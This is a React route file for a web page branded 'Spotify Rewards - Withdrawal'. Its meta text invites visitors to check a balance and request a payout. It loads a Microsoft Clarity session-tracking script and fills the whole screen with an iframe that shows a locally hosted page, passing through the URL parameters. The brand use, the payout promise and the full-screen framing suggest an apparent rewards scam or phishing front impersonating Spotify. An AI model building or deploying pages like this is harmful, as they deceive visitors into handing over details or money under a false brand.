import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";


export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Spotify Rewards - Withdrawal" },
      {
        name: "description",
        content: "Check your Spotify Rewards balance and request your withdrawal.",
      },
      { property: "og:title", content: "Spotify Rewards - Withdrawal" },
      {
        property: "og:description",
        content: "Check your Spotify Rewards balance and request your withdrawal.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    scripts: [
      
      {
        children: `(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "yft2re9p41");`,
      },
    ],
  }),
  component: SpotifyPage,
});

function SpotifyPage() {
  const [search, setSearch] = useState("");

  useEffect(() => {
    setSearch(window.location.search);
  }, []);

  return (
    <iframe
      src={`/sp/type/index.html${search}`}
      title="Spotify Rewards"
      style={{
        position: "fixed",
        inset: 0,
        width: "100%",
        height: "100%",
        border: "none",
      }}
    />
  );
}
